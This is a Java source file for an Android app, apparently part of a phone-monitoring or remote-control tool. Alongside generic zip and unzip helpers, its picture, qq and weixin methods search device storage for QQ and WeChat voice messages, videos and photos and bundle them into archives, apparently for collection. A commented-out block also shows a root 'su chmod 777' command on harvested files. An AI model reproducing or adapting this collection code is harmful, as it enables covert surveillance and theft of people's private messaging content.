package com.lfish.control.action.actiontool;

import java.io.BufferedInputStream;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import android.content.Context;

import com.lfish.control.utils.MyLog;


public class Zip {
	private static final int BUFF_SIZE = 1024 * 1024; // 1M Byte


	public static void picture(Context context, String path, String zipFile) {
		MyLog.v("qq的目录：", "搜索图片中");
		File file = new File(zipFile);
		ArrayList<File> arrayList = FileUtils.listFiles(path, ".jpg");

		if (null != arrayList && arrayList.size() > 0) {
			try {
				zipFiles(arrayList, file);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public static void qq(String zipFile)throws Exception {
		MyLog.v("qq的目录：","搜索qq录音中");
		File file = new File(zipFile);
		ZipOutputStream zipout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(
				file), BUFF_SIZE));

		ArrayList<File> arrayList = FileUtils.listFiles(Utils.SDPATH +"/tencent/MobileQQ", ".slk");
		if (null != arrayList && arrayList.size() > 0) {
			try {
				for (File resFile : arrayList) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		ArrayList<File> p4List = FileUtils.listFiles(Utils.SDPATH +"/tencent/MobileQQ", ".mp4");
		if (null != p4List && p4List.size() > 0) {
			try {
				for (File resFile : p4List) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		ArrayList<File> pgList = FileUtils.listFiles(Utils.SDPATH +"/tencent/MobileQQ", ".jpg");
		if (null != pgList && pgList.size() > 0) {
			try {
				for (File resFile : pgList) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		zipout.close();
	}

	public static void weixin(String zipFile)throws Exception {
		MyLog.v("qq的目录：","搜索微信语音文件中");
		File file = new File(zipFile);
		ZipOutputStream zipout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(
				file), BUFF_SIZE));

		ArrayList<File> arrayList = FileUtils.listFiles(Utils.SDPATH +"/tencent/MicroMsg", ".amr");
		if (null != arrayList && arrayList.size() > 0) {
			try {
				for (File resFile : arrayList) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		ArrayList<File> p4List = FileUtils.listFiles(Utils.SDPATH +"/tencent/MicroMsg", ".mp4");
		if (null != p4List && p4List.size() > 0) {
			try {
				for (File resFile : p4List) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		ArrayList<File> pgList = FileUtils.listFiles(Utils.SDPATH +"/tencent/MicroMsg", ".jpg");
		if (null != pgList && pgList.size() > 0) {
			try {
				for (File resFile : pgList) {
					zipFile(resFile, zipout, "");
					MyLog.v("搜索到的文件：",resFile.toString());
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		zipout.close();
	}


	/**
	 * 批量压缩文件（夹）
	 *
	 * @param resFileList 要压缩的文件（夹）列表
	 * @param zipFile 生成的压缩文件
	 * @throws IOException 当压缩过程出错时抛出
	 */
	public static void zipFiles(Collection<File> resFileList, File zipFile) throws IOException {
		ZipOutputStream zipout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(
				zipFile), BUFF_SIZE));
		for (File resFile : resFileList) {
			zipFile(resFile, zipout, "");
		}
		zipout.close();
	}

	/**
	 * 批量压缩文件（夹）
	 *
	 * @param resFileList 要压缩的文件（夹）列表
	 * @param zipFile 生成的压缩文件
	 * @param comment 压缩文件的注释
	 * @throws IOException 当压缩过程出错时抛出
	 */
	public static void zipFiles(Collection<File> resFileList, File zipFile, String comment)
			throws IOException {
		ZipOutputStream zipout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(
				zipFile), BUFF_SIZE));
		for (File resFile : resFileList) {
			zipFile(resFile, zipout, "");
		}
		zipout.setComment(comment);
		zipout.close();
	}

	/**
	 * 解压缩一个文件
	 *
	 * @param zipFile 压缩文件
	 * @param folderPath 解压缩的目标目录
	 * @throws IOException 当解压缩过程出错时抛出
	 */
	public static void upZipFile(File zipFile, String folderPath) throws ZipException, IOException {
		File desDir = new File(folderPath);
		if (!desDir.exists()) {
			desDir.mkdirs();
		}
		ZipFile zf = new ZipFile(zipFile);
		for (Enumeration<?> entries = zf.entries(); entries.hasMoreElements();) {
			ZipEntry entry = ((ZipEntry)entries.nextElement());
			InputStream in = zf.getInputStream(entry);
			String str = folderPath + File.separator + entry.getName();
			str = new String(str.getBytes("8859_1"), "GB2312");
			File desFile = new File(str);
			if (!desFile.exists()) {
				File fileParentDir = desFile.getParentFile();
				if (!fileParentDir.exists()) {
					fileParentDir.mkdirs();
				}
				desFile.createNewFile();
			}
			OutputStream out = new FileOutputStream(desFile);
			byte buffer[] = new byte[BUFF_SIZE];
			int realLength;
			while ((realLength = in.read(buffer)) > 0) {
				out.write(buffer, 0, realLength);
			}
			in.close();
			out.close();
		}
		zf.close();
	}

	/**
	 * 解压文件名包含传入文字的文件
	 *
	 * @param zipFile 压缩文件
	 * @param folderPath 目标文件夹
	 * @param nameContains 传入的文件匹配名
	 * @throws ZipException 压缩格式有误时抛出
	 * @throws IOException IO错误时抛出
	 */
	public static ArrayList<File> upZipSelectedFile(File zipFile, String folderPath,
													String nameContains) throws ZipException, IOException {
		ArrayList<File> fileList = new ArrayList<File>();

		File desDir = new File(folderPath);
		if (!desDir.exists()) {
			desDir.mkdir();
		}

		ZipFile zf = new ZipFile(zipFile);
		for (Enumeration<?> entries = zf.entries(); entries.hasMoreElements();) {
			ZipEntry entry = ((ZipEntry)entries.nextElement());
			if (entry.getName().contains(nameContains)) {
				InputStream in = zf.getInputStream(entry);
				String str = folderPath + File.separator + entry.getName();
				str = new String(str.getBytes("8859_1"), "GB2312");
				// str.getBytes("GB2312"),"8859_1" 输出
				// str.getBytes("8859_1"),"GB2312" 输入
				File desFile = new File(str);
				if (!desFile.exists()) {
					File fileParentDir = desFile.getParentFile();
					if (!fileParentDir.exists()) {
						fileParentDir.mkdirs();
					}
					desFile.createNewFile();
				}
				OutputStream out = new FileOutputStream(desFile);
				byte buffer[] = new byte[BUFF_SIZE];
				int realLength;
				while ((realLength = in.read(buffer)) > 0) {
					out.write(buffer, 0, realLength);
				}
				in.close();
				out.close();
				fileList.add(desFile);
			}
		}
		zf.close();
		return fileList;
	}

	/**
	 * 获得压缩文件内文件列表
	 *
	 * @param zipFile 压缩文件
	 * @return 压缩文件内文件名称
	 * @throws ZipException 压缩文件格式有误时抛出
	 * @throws IOException 当解压缩过程出错时抛出
	 */
	public static ArrayList<String> getEntriesNames(File zipFile) throws ZipException, IOException {
		ArrayList<String> entryNames = new ArrayList<String>();
		ZipFile zf = new ZipFile(zipFile);
		Enumeration<?> entries = zf.entries();
		while (entries.hasMoreElements()) {
			ZipEntry entry = ((ZipEntry)entries.nextElement());
			entryNames.add(new String(getEntryName(entry).getBytes("GB2312"), "8859_1"));
		}
		zf.close();
		return entryNames;
	}

	/**
	 * 取得压缩文件对象的注释
	 *
	 * @param entry 压缩文件对象
	 * @return 压缩文件对象的注释
	 * @throws UnsupportedEncodingException
	 */
	public static String getEntryComment(ZipEntry entry) throws UnsupportedEncodingException {
		return new String(entry.getComment().getBytes("GB2312"), "8859_1");
	}

	/**
	 * 取得压缩文件对象的名称
	 *
	 * @param entry 压缩文件对象
	 * @return 压缩文件对象的名称
	 * @throws UnsupportedEncodingException
	 */
	public static String getEntryName(ZipEntry entry) throws UnsupportedEncodingException {
		return new String(entry.getName().getBytes("GB2312"), "8859_1");
	}

	/**
	 * 压缩文件
	 *
	 * @param resFile 需要压缩的文件（夹）
	 * @param zipout 压缩的目的文件
	 * @param rootpath 压缩的文件路径
	 * @throws FileNotFoundException 找不到文件时抛出
	 * @throws IOException 当压缩过程出错时抛出
	 */
	private static void zipFile(File resFile, ZipOutputStream zipout, String rootpath)
			throws FileNotFoundException, IOException {
		rootpath = rootpath + (rootpath.trim().length() == 0 ? "" : File.separator)
				+ resFile.getName();
		rootpath = new String(rootpath.getBytes("8859_1"), "GB2312");
		if (resFile.isDirectory()) {
			File[] fileList = resFile.listFiles();
			for (File file : fileList) {
				zipFile(file, zipout, rootpath);
			}
		} else {
			byte buffer[] = new byte[BUFF_SIZE];
			BufferedInputStream in = new BufferedInputStream(new FileInputStream(resFile),
					BUFF_SIZE);
			zipout.putNextEntry(new ZipEntry(rootpath));
			int realLength;
			while ((realLength = in.read(buffer)) != -1) {
				zipout.write(buffer, 0, realLength);
			}
			in.close();
			zipout.flush();
			zipout.closeEntry();
		}
	}


	public static void zipFolder(String srcFilePath, String zipFilePath)throws Exception {
		//创建Zip包
		java.util.zip.ZipOutputStream outZip =
				new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(zipFilePath));

		//打开要输出的文件
		java.io.File file = new java.io.File(srcFilePath);

		//压缩
		zipFiles(file.getParent()+java.io.File.separator, file.getName(), outZip);

		//完成,关闭
		outZip.finish();
		outZip.close();

	}//end of func

	public static void zipFolder(String srcFilePath1, String srcFilePath2,String zipFilePath)throws Exception {
		//创建Zip包
		java.util.zip.ZipOutputStream outZip =
				new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(zipFilePath));

		//打开要输出的文件
		java.io.File file1 = new java.io.File(srcFilePath1);

		//压缩
		zipFiles(file1.getParent()+java.io.File.separator, file1.getName(), outZip);
		//打开要输出的文件
		java.io.File file2 = new java.io.File(srcFilePath2);

		//压缩
		zipFiles(file2.getParent()+java.io.File.separator, file2.getName(), outZip);

		//完成,关闭
		outZip.finish();
		outZip.close();

	}//end of func


	/**
	 * 压缩文件
	 * @param folderPath
	 * @param filePath
	 * @param zipOut
	 * @throws Exception
	 */
	private static void zipFiles(String folderPath, String filePath,
								 java.util.zip.ZipOutputStream zipOut)throws Exception{
		if(zipOut == null){
			return;
		}

		java.io.File file = new java.io.File(folderPath+filePath);

		//判断是不是文件
		if (file.isFile()) {
			filedata(file.getAbsolutePath());
			java.util.zip.ZipEntry zipEntry =  new java.util.zip.ZipEntry(filePath);
			java.io.FileInputStream inputStream = new java.io.FileInputStream(file);
			zipOut.putNextEntry(zipEntry);

			int len;
			byte[] buffer = new byte[4096];

			while((len=inputStream.read(buffer)) != -1) {
				zipOut.write(buffer, 0, len);
			}

			zipOut.closeEntry();
			inputStream.close();
		} else {
			//文件夹的方式,获取文件夹下的子文件
			String fileList[] = file.list();
			if(fileList != null)
			{
				//如果没有子文件, 则添加进去即可
				if (fileList.length <= 0) {
					java.util.zip.ZipEntry zipEntry =
							new java.util.zip.ZipEntry(filePath+java.io.File.separator);
					zipOut.putNextEntry(zipEntry);
					zipOut.closeEntry();
				}

				//如果有子文件, 遍历子文件
				for (int i = 0; i < fileList.length; i++) {
					zipFiles(folderPath, filePath+java.io.File.separator+fileList[i], zipOut);
				}//end of for
			}

		}//end of if

	}//end of func

	public static void filedata(String lj){
		try {
//					RTTool.RTrun("chmod 777 " + lj);
//					File destFile=new File(lj);
//		              String command = "system/bin/su su chmod 777 " + destFile.getAbsolutePath();
//		              java.lang.Process proc =Runtime.getRuntime().exec(command);
//		              proc.waitFor();
//		              proc.exitValue();
//		             } catch (IOException e) {
//		              e.printStackTrace();
		}
		catch (Exception e) {
			e.printStackTrace();
		}

	}

	// 遍历接收一个文件路径，然后把文件子目录中的所有文件遍历并输出来
	public void getAllFiles(File root){
		File files[] = root.listFiles();
		if(files != null){
			for (File f : files){
				if(f.isDirectory()){
					filedata(f.getPath().toString());
					getAllFiles(f);
				}else{
					filedata(f.getPath().toString());
				}
			}
		}
	}
}
